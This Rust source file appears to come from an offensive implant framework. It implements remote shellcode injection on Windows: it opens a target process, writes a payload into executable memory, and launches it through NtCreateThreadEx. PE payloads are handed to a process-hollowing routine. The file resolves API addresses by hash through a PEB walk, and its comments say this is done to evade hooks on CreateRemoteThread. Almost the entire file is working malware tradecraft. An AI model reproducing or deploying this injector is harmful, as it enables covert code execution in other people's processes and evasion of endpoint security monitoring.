use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct NtCreateThreadInjector;

#[cfg(windows)]
impl Injector for NtCreateThreadInjector {
    /// Inject shellcode into a target process.
    ///
    /// The original implementation suspended an existing thread, redirected its
    /// RIP, and appended a `push <orig_rip> / ret` trampoline so execution would
    /// resume normally after the shellcode returned.  The trampoline assumption is
    /// fragile: shellcodes that loop forever or call `ExitThread` never reach the
    /// trampoline, leaving the hijacked thread in an undefined state and destabilising
    /// the target process (L-06 fix).
    ///
    /// Replacement: allocate a fresh thread via `NtCreateThreadEx` that starts
    /// directly at the shellcode.  The target process's other threads are never
    /// touched, eliminating the return assumption entirely.
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
        use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_WRITE,
        };

        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            log::info!(
                "PE payload detected, forwarding to process hollowing's inject_into_process"
            );
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
            };
        }

        unsafe {
            let h_proc = OpenProcess(
                PROCESS_VM_OPERATION
                    | PROCESS_VM_WRITE
                    | PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION,
                0,
                pid,
            );
            if h_proc.is_null() {
                return Err(anyhow!("Failed to open process"));
            }

            // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread.
            let ntdll_base =
                pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                    .unwrap_or(0);
            if ntdll_base == 0 {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("ThreadHijackInjector: ntdll not found in PEB"));
            }
            let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            );
            let ntcreate_addr = match ntcreate_addr {
                Some(a) => a,
                None => {
                    pe_resolve::close_handle(h_proc);
                    return Err(anyhow!("ThreadHijackInjector: NtCreateThreadEx not found"));
                }
            };
            type NtCreateThreadExFn = unsafe extern "system" fn(
                *mut *mut std::os::raw::c_void,
                u32,
                *mut std::os::raw::c_void,
                *mut std::os::raw::c_void,
                *mut std::os::raw::c_void,
                *mut std::os::raw::c_void,
                u32,
                usize,
                usize,
                usize,
                *mut std::os::raw::c_void,
            ) -> i32;
            let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

            // Allocate RW memory, write shellcode, then flip to RX.
            let remote_mem = VirtualAllocEx(
                h_proc,
                std::ptr::null_mut(),
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if remote_mem.is_null() {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("VirtualAllocEx failed"));
            }

            let mut written = 0usize;
            if WriteProcessMemory(
                h_proc,
                remote_mem,
                payload.as_ptr() as _,
                payload.len(),
                &mut written,
            ) == 0
            {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("WriteProcessMemory failed"));
            }
            if written != payload.len() {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!(
                    "WriteProcessMemory wrote {} of {} bytes",
                    written,
                    payload.len()
                ));
            }

            let mut old_prot = 0u32;
            if VirtualProtectEx(
                h_proc,
                remote_mem,
                payload.len(),
                PAGE_EXECUTE_READ,
                &mut old_prot,
            ) == 0
            {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("VirtualProtectEx to RX failed"));
            }
            // Flush I-cache before creating the new thread.
            FlushInstructionCache(h_proc, remote_mem, payload.len());

            let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
            let status = nt_create_thread(
                &mut h_thread,
                0x1FFFFF,
                std::ptr::null_mut(),
                h_proc,
                remote_mem,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            );
            if status < 0 || h_thread.is_null() {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("NtCreateThreadEx failed: {:x}", status));
            }

            pe_resolve::close_handle(h_thread);
            pe_resolve::close_handle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for NtCreateThreadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("NtCreateThread injection only supported on Windows"))
    }
}
